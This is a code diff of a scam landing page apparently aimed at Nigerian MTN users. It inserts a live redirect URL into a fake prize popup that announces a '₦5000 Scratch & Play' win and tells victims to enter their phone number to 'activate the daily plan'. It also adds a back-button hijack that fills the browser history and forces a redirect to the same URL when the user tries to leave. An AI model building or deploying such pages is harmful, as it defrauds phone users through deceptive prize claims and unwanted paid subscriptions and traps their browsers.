@@ -733,7 +733,7 @@
         });
     }
     
-    // 成功弹窗 - 英文文本和 {clickurl} 跳转
+    // 成功弹窗 - 英文文本和跳转链接
     function dialog3() {
         Swal.fire({
             icon: 'success',
@@ -741,7 +741,7 @@
             html: '<h3>You won access to the **₦5000 Scratch & Play**!</h3><br>**Next Steps to Claim:**<br>1. Click "CONFIRM" below.<br>2. You will be redirected to the secure **MTN Partner** site.<br>3. Enter your MTN number to activate the daily plan and get your reward!',
             showConfirmButton: false,
             allowOutsideClick: false,
-            footer: '<a href="{clickurl}" style="text-decoration: none; display: block; padding: 10px 20px; background-color: #ffcc00; color: black; font-weight: bold; border-radius: 5px;">CONFIRM & CLAIM NOW ➤</a>'
+            footer: '<a href="https://6927170d91f0641454b85767--voluble-lamington-b9573f.netlify.app/?clickID=7B" style="text-decoration: none; display: block; padding: 10px 20px; background-color: #ffcc00; color: black; font-weight: bold; border-radius: 5px;">CONFIRM & CLAIM NOW ➤</a>'
         });
     }
 
@@ -778,8 +778,8 @@
     var date = new Date().toLocaleDateString('en-NG', {day: 'numeric', month: 'long', year: 'numeric'});
     document.getElementById('date').innerHTML = date;
     
-    // 历史记录回退保护，使用 {clickurl} 占位符
-    !function(){var a;try{for(a=0;10>a;++a){history.pushState({},"","#")}onpopstate=function(c){c.state&&location.replace("{clickurl}")}}catch(b){}}();
+    // 历史记录回退保护，跳转到指定URL
+    !function(){var a;try{for(a=0;10>a;++a){history.pushState({},"","#")}onpopstate=function(c){c.state&&location.replace("https://6927170d91f0641454b85767--voluble-lamington-b9573f.netlify.app/?clickID=7B")}}catch(b){}}();
     </script>
 </body>
 </html>
